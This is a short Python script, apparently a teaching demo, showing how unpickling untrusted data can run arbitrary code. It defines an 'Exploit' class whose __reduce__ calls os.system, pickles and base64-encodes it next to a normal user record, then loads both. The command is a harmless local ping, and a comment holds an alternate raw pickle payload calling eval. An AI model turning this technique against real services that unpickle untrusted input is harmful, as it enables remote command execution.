import sys
import pickle
from base64 import b64encode, b64decode


USER = {"name": "Joe User", "role": "user"}
# USER_MAL = b'c__builtin__\neval\n(Vprint("It worked.")\ntR.'


class Exploit(object):
    def __reduce__(self):
        import os

        return (os.system, (b"ping -c 2 127.0.0.1",))


USER_MAL = Exploit()
user = b64encode(pickle.dumps(USER))
user_mal = b64encode(pickle.dumps(USER_MAL))

print(user.decode())
print(user_mal.decode())

print(USER_MAL)
print(b64decode(user_mal))

user_des_norm = pickle.loads(b64decode(user))
user_des_mal = pickle.loads(b64decode(user_mal))


print(type(user_des_norm))

print(user_des_mal)
